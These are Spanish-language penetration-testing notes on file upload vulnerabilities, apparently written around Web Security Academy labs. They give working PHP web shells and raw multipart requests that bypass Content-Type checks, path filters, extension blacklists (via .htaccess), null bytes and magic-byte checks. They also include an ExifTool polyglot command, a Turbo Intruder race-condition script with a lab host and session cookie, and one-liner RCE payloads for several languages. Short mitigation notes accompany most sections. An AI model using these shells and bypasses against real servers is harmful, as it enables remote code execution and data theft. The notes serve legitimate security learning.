
---
Tags: #FileUpload #WebShell #RCE #MagicBytes #Polyglot #RaceCondition #BurpSuite #TurboIntruder #ExifTool #Htaccess #PathTraversal #NullByte #PHP-Exploitation #SinglePacketAttack

---
## 📑 Índice

- [[#1. Conceptos Fundamentales]]
    
- [[#2. Ejecución Remota con Web Shell Básica]]
    
- [[#3. Web Shell por Bypass de Content-Type]]
    
- [[#4. Web Shell por Path Traversal]]
	
- [[#5. Web Shell por Bypass de Blacklist de Extensiones (.htaccess)]]
    
- [[#6. Web Shell con Extensión Ofuscada (Null Byte)]]
    
- [[#7. Ejecución Remota con Web Shell Multi-formato (Polyglot)]]
    
- [[#8. Explotación mediante Race Condition]]
    
- [[#9. Tabla Resumen de Técnicas de Evasión]]
	
	- [[#10. Diccionario de Magic Bytes (Firmas de Archivos)]]
    
	- [[#11. Equivalentes de .htaccess en otros Entornos]]
    
	- [[#12. Dobles Extensiones y Evasiones Específicas]]
    
	- [[#13. Tabla de Payloads "One-Liner" por Lenguaje]]
	
---

## <font color="#3498db">1. Conceptos Fundamentales</font>

Las vulnerabilidades de **Subida de Archivos Sin Restricciones** ocurren cuando un servidor web permite a los usuarios subir archivos a su sistema de ficheros sin validar adecuadamente aspectos cruciales como el nombre, el tipo, el contenido o el tamaño del archivo.

Si un atacante logra subir un archivo ejecutable (como un script en PHP, Python, ASP, etc.) a un directorio web accesible y el servidor está configurado para ejecutar ese tipo de archivos, se consigue **RCE (Remote Code Execution)**.

---

## <font color="#e74c3c">2. Ejecución Remota con Web Shell Básica</font>

Esta es la técnica más fundamental. Ocurre cuando el servidor no implementa ningún tipo de filtro en la subida de archivos, permitiendo subir código fuente directamente.

### 🔍 ¿Cómo descubrirlo y explotarlo?

1. Se identifica un endpoint de subida de archivos (ej. foto de perfil, adjuntos).
    
2. Se intenta subir un archivo con extensión ejecutable (ej. `.php`).
    
3. Si la subida es exitosa, se navega a la ruta donde se guardó el archivo (ej. `/uploads/profile.php`).
    
4. Se interactúa con la shell para ejecutar comandos del sistema a través del contexto del usuario del servidor web (usualmente `www-data`).
    

### 💻 PoC (Proof of Concept)

Podemos utilizar una web shell interactiva con interfaz HTML:

```PHP
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80" placeholder="Introduce un comando...">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        // system() ejecuta el comando y muestra la salida directamente
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```

O una versión más minimalista ("One-Liner"), ideal cuando hay restricciones de tamaño:


```PHP
<?php
// shell_exec() ejecuta el comando y devuelve la salida como string
echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

- **Uso:** Navegar a `http://sitio.com/uploads/shell.php?cmd=whoami`
    

### 🛡️ Mitigación

- No permitir la ejecución de scripts en los directorios de subida (ej. configurando `php_admin_value engine Off` en Apache o bloqueando la ejecución en Nginx).
    

---

## <font color="#e74c3c">3. Web Shell por Bypass de Content-Type</font>

A menudo, los desarrolladores intentan asegurar la subida de archivos verificando únicamente la cabecera `Content-Type` de la petición HTTP. Esta cabecera es proporcionada por el cliente (el navegador) y confían erróneamente en que si dice `image/png`, el archivo es realmente una imagen.

### 🔍 ¿Cómo descubrirlo y explotarlo?

1. Intentamos subir nuestro archivo `.php`. El servidor lo rechaza.
    
2. Interceptamos la petición POST de subida con un proxy (como **Burp Suite**).
    
3. Observamos que el campo `Content-Type` asociado a nuestro archivo indica `application/x-php`.
    
4. Modificamos ese valor por un tipo MIME aceptado (ej. `image/png` o `image/jpeg`).
    
5. El backend, al validar solo la cabecera y no el contenido real, acepta el archivo.
    

### 💻 PoC (Modificación en Burp Suite)

**Petición original interceptada (Rechazada):**

```HTTP
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/x-php

<?php echo system($_GET['cmd']); ?>
```

**Petición modificada (Aceptada):**

```HTTP
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: image/png

<?php echo system($_GET['cmd']); ?>
```

### 🛡️ Mitigación

- Validar el contenido real del archivo verificando los _Magic Bytes_ (las firmas de archivo) en el backend, no confiando nunca en el input del cliente.
    

---

## <font color="#e74c3c">4. Web Shell por Path Traversal</font>

En ocasiones, podemos subir archivos `.php` y evadir filtros de tipo MIME, pero al navegar al archivo subido, el servidor nos devuelve el código en texto plano en lugar de ejecutarlo. Esto sucede porque el directorio de destino (`/avatars/` o `/uploads/`) tiene los permisos de ejecución desactivados por seguridad.

La técnica de **Path Traversal (Salto de Directorio)** se usa durante la _subida_ para forzar al servidor a guardar el archivo en un directorio diferente, superior en la jerarquía, que sí tenga permisos de ejecución.

### 🔍 ¿Cómo descubrirlo y explotarlo?

1. Interceptamos la petición de subida.
    
2. Modificamos el parámetro `filename` inyectando secuencias de salto de directorio: `../`
    
3. Si el backend implementa defensas básicas, puede sanitizar el nombre eliminando las barras `/`. Para evadir esto, utilizamos **URL Encoding**. La barra diagonal `/` se codifica como `%2f`.
    
4. El servidor concatena su ruta base de subida con nuestro nombre modificado: `/var/www/html/uploads/` + `..%2fwebshell.php` = `/var/www/html/webshell.php`.
    

### 💻 PoC (Evasión de Directorio)

Modificamos el atributo `filename` en la petición multipart:

```HTTP
Content-Disposition: form-data; name="avatar"; filename="..%2fwebshell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
```

- **Resultado:** El archivo no se guarda en `/uploads/`, sino un nivel por encima, evadiendo las restricciones de ejecución de la carpeta contenedora original.
    

### 🛡️ Mitigación

- Sanitizar severamente el parámetro `filename` en el backend, eliminando cualquier carácter especial o secuencia de directorios (`/`, `\`, `..`).
    
- Una práctica mejor es que el servidor genere nombres de archivo aleatorios (ej. UUIDs) descartando por completo el nombre original proporcionado por el usuario.

---

## <font color="#9b59b6">5. Web Shell por Bypass de Blacklist de Extensiones (.htaccess)</font>

En lugar de listas blancas (permitir solo `.jpg`, `.png`), algunos servidores usan listas negras (bloquear `.php`, `.phtml`, `.exe`). Sin embargo, en servidores web Apache, si las configuraciones lo permiten, un atacante puede subir un archivo de configuración distribuida (`.htaccess`) para modificar las reglas del servidor en ese directorio específico.

### 🔍 ¿Cómo descubrirlo y explotarlo?

1. Observamos que el servidor bloquea extensiones conocidas de PHP.
    
2. Subimos un archivo llamado `.htaccess`. Si el servidor lo acepta, tenemos control sobre la configuración de ese directorio.
    
3. Dentro del `.htaccess`, usamos la directiva `AddType` para indicarle a Apache que trate una extensión inventada (o inofensiva) como si fuera código ejecutable de PHP.
    
4. Subimos nuestra web shell con esa extensión inventada.
    

### 💻 PoC (Modificación de reglas de Apache)

**Paso 1: Subir el `.htaccess`**

```HTTP
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .luis
```

_(Nota: Aquí le decimos a Apache: "Cualquier archivo terminado en `.luis`, pásaselo al intérprete de PHP")._

**Paso 2: Subir la Web Shell con la nueva extensión**

```HTTP
Content-Disposition: form-data; name="avatar"; filename="webshell.luis"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
```

- **Resultado:** El servidor no bloquea `.luis` porque no está en la lista negra, pero Apache lo ejecutará como PHP gracias a nuestro `.htaccess`.
    

### 🛡️ Mitigación

- Configurar `AllowOverride None` en el archivo de configuración principal de Apache (`httpd.conf` o `apache2.conf`) para el directorio de subidas. Esto ignora cualquier `.htaccess` subido.
    

---

## <font color="#9b59b6">6. Web Shell con Extensión Ofuscada (Null Byte)</font>

Esta técnica, también conocida como _Null Byte Injection_ (`%00` o `\x00`), explota la diferencia en cómo distintos lenguajes o componentes del sistema operativo leen las cadenas de texto (strings). En lenguajes basados en C, un _Null Byte_ indica el final de una cadena.

### 🔍 ¿Cómo descubrirlo y explotarlo?

1. El servidor utiliza una lista blanca estricta (ej. "el archivo DEBE terminar en `.jpg`").
    
2. Modificamos el nombre del archivo inyectando un _Null Byte_ antes de la extensión permitida: `archivo.php%00.jpg`.
    
3. La validación web (escrita tal vez en PHP o Java de alto nivel) ve que termina en `.jpg` y lo aprueba.
    
4. Al pasarlo al sistema operativo o a funciones de bajo nivel en C para guardarlo en disco, estas leen `archivo.php`, encuentran el `%00`, asumen que es el final del nombre y descartan el resto (`.jpg`).
    
5. El archivo se guarda y se ejecuta como `.php`.
    

### 💻 PoC (Null Byte)

```HTTP
Content-Disposition: form-data; name="avatar"; filename="webshell.php%00.jpg"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
```

### 🛡️ Mitigación

- Actualizar el lenguaje de backend. En PHP, por ejemplo, esto fue mitigado en versiones posteriores a la 5.3.4 en la mayoría de las funciones de sistema de archivos.
    
- Validar y sanitizar estrictamente la entrada, eliminando caracteres de control.
    

---

## <font color="#f39c12">7. Ejecución Remota con Web Shell Multi-formato (Polyglot)</font>

Cuando el servidor verifica el contenido del archivo inspeccionando los **Magic Bytes** (las firmas hexadecimales al principio de un archivo que indican su formato real, ej. `FF D8 FF E0` para JPEG), un simple cambio de extensión no bastará. Un _Polyglot_ es un archivo que es válido en múltiples formatos simultáneamente (ej. es una imagen válida Y un script PHP válido).

### 🔍 ¿Cómo descubrirlo y explotarlo?

1. El servidor rechaza el archivo indicando que "no es una imagen válida" a pesar de tener extensión `.jpg`.
    
2. Falsificamos la cabecera: Añadimos los Magic Bytes de un GIF (`GIF89a;`) al principio del script de texto.
    
3. O usamos herramientas como **ExifTool** para incrustar el payload de PHP dentro de los metadatos (como el campo `Comment`) de una imagen real.
    

### 💻 PoC (Falsificación de Magic Bytes)

```PHP
GIF89a;
<html>
<body>
... (tu código web shell aquí) ...
<?php system($_GET['cmd']); ?>
...
```

### 💻 PoC (Herramienta ExifTool)

Inyectamos código PHP en los metadatos de una imagen legítima:

```Bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' test.jpg -o polyglot.php
```

- **Nota de uso:** Esta técnica es letal si el servidor comprueba que es una imagen, la acepta, pero permite que se guarde con extensión `.php` o si existe un LFI que pueda cargar esta imagen como código.
    

### 🛡️ Mitigación

- Re-procesar todas las imágenes subidas. Utilizar librerías (como GD en PHP o ImageMagick) para decodificar la imagen y volver a codificarla en un nuevo archivo. Esto destruye cualquier payload oculto en metadatos o al final del archivo.
    

---

## <font color="#f39c12">8. Explotación mediante Race Condition</font>

Una vulnerabilidad de _Race Condition_ (Condición de Carrera), específicamente del tipo **Time-of-Check to Time-of-Use (TOCTOU)**, ocurre cuando un sistema realiza una acción sobre un archivo (subirlo) y, poco después, realiza una comprobación o limpieza (borrarlo si no es válido). Durante esa pequeña ventana de tiempo, el archivo malicioso existe en el servidor.

### 🔍 ¿Cómo descubrirlo y explotarlo?

1. El servidor acepta el archivo, lo guarda en `/uploads/`, luego lo analiza y, como es `.php` y no `.jpg`, lo borra en cuestión de milisegundos.
    
2. Usamos la técnica **Single-Packet Attack (HTTP/2)** para enviar una petición de subida y decenas de peticiones de lectura/ejecución exactamente al mismo tiempo.
    
3. Si ganamos la "carrera", logramos ejecutar el archivo `webshell.php` en el servidor _antes_ de que el proceso de limpieza tenga tiempo de borrarlo.
    

### 💻 PoC (Single-Packet Attack con Turbo Intruder)

Utilizamos _Turbo Intruder_ en Burp Suite. En HTTP/2, se pueden meter múltiples peticiones en un solo flujo TCP y enviarlas de golpe.

```Python
def queueRequests(target, wordlists):
    # concurrentConnections=1 y Engine.BURP2 son obligatorios para HTTP/2 Race
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)

    upload_req = target.req # La petición POST original interceptada
    
    # Petición GET para ejecutar el comando
    read_req = """GET /files/avatars/webshell.php?cmd=cat%20/home/carlos/secret HTTP/2
Host: 0ac200da0381f447817561600067007d.web-security-academy.net
Cookie: session=1ZdKJgZJ7agBQ7EEbklHWjI04OUHuLYp

"""

    # Encolamos 1 subida en la 'puerta' (gate)
    engine.queue(upload_req, gate='race')
    
    # Encolamos 30 lecturas en la misma 'puerta' para ametrallar el archivo
    for i in range(30):
        engine.queue(read_req, gate='race')

    # Al abrir la puerta, todas las peticiones salen en el mismo paquete TCP
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

### 🛡️ Mitigación

- Jamás escribir un archivo no confiable directamente en el directorio final de destino web.
    
- Escribir los archivos temporales en memoria o en un directorio externo al _webroot_ con permisos extremadamente restrictivos, realizar las validaciones allí y, solo si es válido, moverlo al directorio de destino.
    

---

## <font color="#27ae60">9. Tabla Resumen de Técnicas de Evasión</font>

|**Técnica de Evasión**|**Lo que el Servidor Filtra**|**Cómo lo Evadimos**|**Herramienta / Concepto Clave**|
|---|---|---|---|
|**Bypass Content-Type**|Cabecera HTTP MIME Type|Cambiar `application/x-php` a `image/jpeg` en Burp.|Proxies (Burp Suite)|
|**Path Traversal**|Ejecución en carpeta destino|Inyectar `..%2f` en el campo `filename`.|URL Encoding|
|**Bypass Blacklist**|Extensiones `.php` prohibidas|Subir `.htaccess` para ejecutar extensiones customizadas.|Directiva `AddType`|
|**Null Byte Injection**|Extensión final (ej. solo `.jpg`)|Añadir `%00.jpg` al final de `archivo.php`.|C-string termination (`\x00`)|
|**Polyglot / Magic Bytes**|Contenido real del archivo|Añadir `GIF89a;` o usar ExifTool en los metadatos.|Firmas Hexadecimales / ExifTool|
|**Race Condition**|Análisis post-subida (Borrado)|Enviar peticiones GET y POST simultáneas en HTTP/2.|Turbo Intruder (Single-Packet Attack)|

---
## <font color="#3498db">10. Diccionario de Magic Bytes (Firmas de Archivos)</font>

Cuando el servidor valida el contenido real del archivo (Content Sniffing), debemos modificar los primeros bytes de nuestro script PHP/ASP/JSP para que coincidan con un formato permitido.

|**Formato**|**Firma Hexadecimal (Magic Bytes)**|**Representación ASCII**|
|---|---|---|
|**JPEG/JPG**|`FF D8 FF E0` o `FF D8 FF E1`|`ÿØÿà`|
|**PNG**|`89 50 4E 47 0D 0A 1A 0A`|`.PNG....`|
|**GIF89a**|`47 49 46 38 39 61`|`GIF89a`|
|**PDF**|`25 50 44 46 2D`|`%PDF-`|
|**ZIP**|`50 4B 03 04`|`PK..`|

> [!TIP]
> 
> **Uso en PoC:** Para bypassear una validación de firma, puedes simplemente escribir `GIF89a;` al principio de tu archivo `.php`. El intérprete de PHP ignorará esa primera línea por no estar entre etiquetas `<?php ?>`, pero el servidor creerá que es un GIF real.

---

## <font color="#9b59b6">11. Equivalentes de .htaccess en otros Entornos</font>

No todo es Apache. Dependiendo de la tecnología del servidor, el archivo de configuración "atacable" cambia. Si logras subir uno de estos, puedes reconfigurar cómo el servidor maneja las extensiones.

|**Servidor / Tech**|**Archivo Clave**|**Técnica de Explotación**|
|---|---|---|
|**Apache**|`.htaccess`|`AddType application/x-httpd-php .txt` (Ejecuta .txt como PHP).|
|**IIS (ASP.NET)**|`web.config`|Modificar `handlers` para permitir ejecución de scripts en carpetas de contenido.|
|**Nginx**|`nginx.conf`|(Raro poder subirlo, pero si se logra, se cambian las directivas `location ~ \.php$`).|
|**ASP.NET Core**|`appsettings.json`|Cambiar configuraciones de rutas o permisos si la app lo lee dinámicamente.|

---

## <font color="#e67e22">12. Dobles Extensiones y Evasiones Específicas</font>

A veces las listas negras son parciales o están mal configuradas. Aquí tienes combinaciones que suelen funcionar cuando `.php` está bloqueado.

### A. Doble Extensión (Evasión de Apache)

En algunas configuraciones de Apache mal hechas (`AddHandler`), el servidor ejecuta el archivo si **cualquiera** de las extensiones es válida.

- **Ejemplo:** `shell.php.jpg` o `shell.php.png`
    
- **Lógica:** El servidor ve `.jpg` al final y lo acepta, pero Apache ve que contiene `.php` y lo procesa.
    

### B. Extensiones Alternativas (Bypass de Listas Negras)

Si `.php` está en la lista negra, prueba sus variantes:

- **PHP:** `.php3`, `.php4`, `.php5`, `.php7`, `.phtml`, `.phar`, `.phps`.
    
- **ASP:** `.aspx`, `.config`, `.ashx`, `.asmx`, `.aspq`, `.axd`.
    
- **JSP:** `.jspx`, `.jsw`, `.jsv`, `.jspf`.
    

---

## <font color="#2ecc71">13. Tabla de Payloads "One-Liner" por Lenguaje</font>

Para tus Polyglots o subidas rápidas, usa estos comandos mínimos para confirmar RCE:

|**Lenguaje**|**Payload Mínimo (PoC)**|
|---|---|
|**PHP**|`<?php system($_GET['c']); ?>`|
|**ASP**|`<% eval request("c") %>`|
|**ASP.NET**|`<%@ Page Language="J#" %><% Response.Write(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("..."))); %>`|
|**JSP (Java)**|`<% Runtime.getRuntime().exec(request.getParameter("c")); %>`|
|**Node.js**|`require('child_process').execSync(req.query.c).toString()`|

---

### 💡 "Filename Obfuscation" Extra

Si el servidor limpia puntos y barras, prueba con:

1. **Case Sensitivity:** `shell.PhP` (Windows suele ser _case-insensitive_ y lo ejecutará, pero el filtro _case-sensitive_ podría no verlo).
    
2. **Trailing dots/spaces:** `shell.php.` o `shell.php` (En Windows, los espacios y puntos al final se eliminan al guardar el archivo, convirtiéndolo en `shell.php`).